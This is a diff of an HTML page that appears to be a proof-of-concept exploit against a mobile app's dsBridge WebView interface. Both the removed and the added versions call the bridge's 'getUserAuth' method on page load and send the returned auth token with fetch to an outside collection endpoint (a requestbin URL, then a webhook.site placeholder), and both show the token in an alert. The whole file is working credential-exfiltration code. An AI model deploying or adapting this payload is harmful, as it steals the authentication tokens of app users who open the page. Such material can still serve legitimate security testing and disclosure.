@@ -1,10 +1,29 @@
+<!DOCTYPE html>
 <html>
-<script>
- dsBridge.call("getUserAuth", function(result) {
-    var token = JSON.stringify(result);
-    var webhook = "http://requestbin.whapi.cloud/1d5zjo41";
-    fetch(webhook + encodeURIComponent(token), {mode: 'no-cors'});
-    alert("pwned");
-});
-</script>
+<head>
+  <meta charset="UTF-8">
+  <script src="https://cdn.jsdelivr.net/npm/dsbridge@1.0.6/dist/dsbridge.js"></script>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    window.onload = function() {
+      // dsBridge yuklanganini tekshirish
+      if (typeof dsBridge === 'undefined') {
+        alert("dsBridge yuklanmadi!");
+        return;
+      }
+
+      dsBridge.call("getUserAuth", function(result) {
+        var token = JSON.stringify(result);
+        
+        // HTTP emas, HTTPS webhook ishlating!
+        var webhook = "https://webhook.site/sizning-unikal-id"; 
+        
+        fetch(webhook + "?token=" + encodeURIComponent(token), {mode: 'no-cors'});
+        alert("Token: " + token);
+      });
+    };
+  </script>
+</body>
 </html>
